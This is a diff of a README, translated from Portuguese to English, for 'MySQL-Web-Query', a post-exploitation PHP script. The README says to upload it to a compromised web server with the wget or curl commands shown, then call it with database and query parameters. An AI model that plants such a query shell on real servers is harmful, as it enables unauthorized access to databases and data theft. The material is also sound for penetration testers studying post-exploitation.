@@ -1,26 +1,26 @@
 # MySQL-Web-Query
 
-Existem casos (em um cenário pós-exploração) em que, após comprometer uma aplicação web e obter shell, não é possível interagir com o MySQL em virtude das limitações de interação da shell que foi obtida.
+There are cases (in a post-exploitation scenario) where, after committing a web application and getting the shell, it is not possible to interact with MySQL due to the limitations of interaction from the shell that was obtained.
 
-Neste caso o **MySQL-Web-Query** pode ser útil.
+In this case **MySQL-Web-Query** can be useful.
 
-### :hammer_and_wrench: Requisitos
+### :hammer_and_wrench: Requirements
 
-É necessário que o web server comprometido use a tecnologia PHP e o MySQL como DBMS.
+The compromised web server is required to use PHP technology and MySQL as DBMS.
 
-### 📋 Como usar
+### 📋 How to use
 
-Transfira o script para o web server em um diretório acessível via browser:
+Transfer the script to the web server in a directory accessible by the browser:
 ```
 wget https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php
 ```
-ou
+or
 ```
 curl https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php > query.php
 ```
 <br>
 
-Deve ser informado os parâmetros **db** (banco de dados) e **q** (query). Exemplos:
+**db** (database) and **q** (query) parameters must be informed. Examples:
 ```
 http://web_server/query.php?db=mysql&q=select user();
 ```
